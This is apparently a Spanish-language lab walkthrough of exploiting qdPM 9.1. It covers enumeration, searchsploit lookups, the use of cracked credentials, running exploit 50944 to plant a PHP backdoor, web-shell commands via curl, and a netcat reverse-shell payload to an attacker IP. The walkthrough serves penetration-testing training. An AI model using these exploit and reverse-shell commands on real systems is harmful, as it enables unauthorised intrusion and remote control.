# Walk: PublicExploitsWalkthrough

## Fecha: 07/02/2025
## Host: Ubuntu
## IP: 192.168.227.11
## Objetivo
Reproducir ejecricio de busqueda e implementacion de exploit

---
## Herramientas
1. searchsploit
2. nmap
3. gobuster
4. curl
---
## Procedimiento y comandos
#### Paso 1:  Enumeracion con nmap y gobuster 
1. `nmap -v --open -sV 192.168.227.11 -oN nmap-result.txt`
2. `gobuster dir -u http://192.168.227.11 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt`
#### Paso 2: Buscamos el Exploit con searchsploit
1. De la enumeracion anterior observamos que existe un directorio **/project** con un forumlario de login,
navegamos hacia este directorio y observamos que debajo del formulario nos indica la tecnologia con la que este login esta administrado. _**qdPM 9.1**_
2. Una rapida busqeda en exploitDB revela: [qdPM9.1 Exploit](https://www.exploit-db.com/exploits/50944)
3. Tambien buscamos con **searchsploit**: 
`searchsploit qdPM 9.1` y obtenemos:
```
searchsploit qdPM 9.1                                                 
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
qdPM 9.1 - 'cfg[app_app_name]' Persistent Cross-Site Scripting                                                                            | php/webapps/48486.txt
qdPM 9.1 - 'filter_by' SQL Injection                                                                                                      | php/webapps/45767.txt
qdPM 9.1 - 'search[keywords]' Cross-Site Scripting                                                                                        | php/webapps/46399.txt
qdPM 9.1 - 'search_by_extrafields[]' SQL Injection                                                                                        | php/webapps/46387.txt
qdPM 9.1 - 'type' Cross-Site Scripting                                                                                                    | php/webapps/46398.txt
qdPM 9.1 - Arbitrary File Upload                                                                                                          | php/webapps/48460.txt
qdPM 9.1 - Remote Code Execution                                                                                                          | php/webapps/47954.py
qdPM 9.1 - Remote Code Execution (Authenticated)                                                                                          | php/webapps/50175.py
qdPM 9.1 - Remote Code Execution (RCE) (Authenticated) (v2)                                                                               | php/webapps/50944.py
qdPM < 9.1 - Remote Code Execution                                                                                                        | multiple/webapps/48146.py
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
#### Paso 3: Analizar el Exploit
1. El exploit se alinea con lo que buscamos.
2. Esta verificado.
3. Requerimientos del Exploit: **Credenciales validas**

#### Paso 4:  Obtener  credenciales validas para utilizar con el exploit
1. Se genera un ataque de diccionario y obtenemos las credenciales:
`george@AIDevCorp.org:AIDevCorp`
> No se detalla el ataque de diccionario a efectos de que los ataques de diccionario no son parte del modulo en cuestion, y esto es un walkthrough de busqueda y ejecucion de exploits.

#### Paso 5: Implementacion del Exploit  
1. Copiamos el exploit en el directorio de trabajo.
`searchsploit -m 50944`
2. Ejecutamos el exploit contra el direcotrio:
`python3 50944.py -url http://192.168.227.11/project/ -u george@AIDevCorp.org -p AIDevCorp`
```
You are not able to use the designated admin account because they do not have a myAccount page.

The DateStamp is 2025-02-08 02:36 
Backdoor uploaded at - > http://192.168.227.11/project/uploads/users/329679-backdoor.php?cmd=whoami
```
3.  Probamos el web shell obtenido en /project/uploads/users/329679-backdor.php
`curl http://192.168.227.11/project/uploads/users/329679-backdoor.php?cmd=whoami`
- Obtenemos: `www-data`
#### Paso 6: Obtenemos un reverse shell
1. Consultamos si nc esta en el servidor:
`curl http://192.168.227.11/project/uploads/users/329679-backdoor.php --data-urlencode "cmd=which nc"`
2. Levantamos nuestro receptor nc:
`nc -lnvp 6666`
3. Cargamos el payload al endpoint que aloja el backdor:
4. `curl http://192.168.227.11/project/uploads/users/329679-backdoor.php --data-urlencode "cmd=nc -nv 192.168.45.189 6666 -e /bin/bash"`

